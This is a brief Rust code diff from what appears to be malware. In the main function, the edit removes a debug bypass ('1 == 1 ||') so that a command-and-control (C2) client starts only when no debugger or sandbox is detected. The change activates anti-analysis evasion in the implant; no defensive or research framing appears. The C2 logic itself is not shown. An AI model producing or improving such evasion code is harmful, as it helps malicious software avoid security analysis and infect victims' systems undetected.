@@ -14,8 +14,7 @@ use std::{
 async fn main() {
     let args: Vec<String> = env::args().collect();
     if args.len() < 2 {
-        if 1 == 1
-            || !system::sandbox::is_debugger_detected() && !system::sandbox::is_sandbox_detected()
+        if !system::sandbox::is_debugger_detected() && !system::sandbox::is_sandbox_detected()
         {
             let c2 = c2::api::C2API::new();
 
